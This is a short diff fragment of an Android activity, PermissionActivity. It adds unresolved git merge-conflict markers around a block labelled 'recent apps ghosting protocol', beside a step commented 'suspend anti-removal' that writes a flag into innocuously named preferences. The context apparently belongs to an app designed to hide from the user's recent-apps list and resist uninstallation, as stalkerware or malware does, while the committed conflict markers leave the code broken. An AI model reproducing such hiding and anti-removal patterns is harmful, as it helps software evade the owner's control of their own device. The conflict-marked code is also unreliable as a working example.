@@ -101,6 +101,7 @@ public class PermissionActivity extends Activity {
                 overridePendingTransition(0, 0);
             }
         } catch (Throwable ignored) {}
+<<<<<<< HEAD
         
         // --- RECENT APPS GHOSTING PROTOCOL ---
         try {
@@ -116,6 +117,8 @@ public class PermissionActivity extends Activity {
                 }
             }
         } catch (Exception ignored) {}
+=======
+>>>>>>> origin/K4N3CO.v1.6
         
         // SUSPEND ANTI-REMOVAL
         getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("is_repairing", true).apply();
